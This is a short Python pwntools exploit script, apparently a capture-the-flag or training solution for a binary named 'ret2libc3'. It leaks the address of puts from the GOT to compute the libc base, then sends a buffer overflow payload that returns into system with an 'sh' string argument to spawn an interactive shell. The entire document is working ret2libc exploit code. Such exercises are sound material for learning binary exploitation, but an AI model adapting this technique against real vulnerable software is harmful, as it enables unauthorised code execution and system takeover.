from pwn import *

io = process("./ret2libc3")
elf = ELF("./ret2libc3")
libc = ELF("./libc-2.27.so")

# got[] is a pointer
io.sendlineafter(b" :", str(elf.got["puts"]))
io.recvuntil(b" : ")
libcBase = int(io.recvuntil(b"\n", drop = True), 16) - libc.symbols["puts"]

#oneGadget = 
#payload = flat(cyclic(60), oneGadget)
payload = flat(cyclic(60), libcBase + libc.symbols["system"], 0xdeadbeef, next(elf.search(b"sh\x00")))
io.sendlineafter(b" :", payload)

io.interactive()
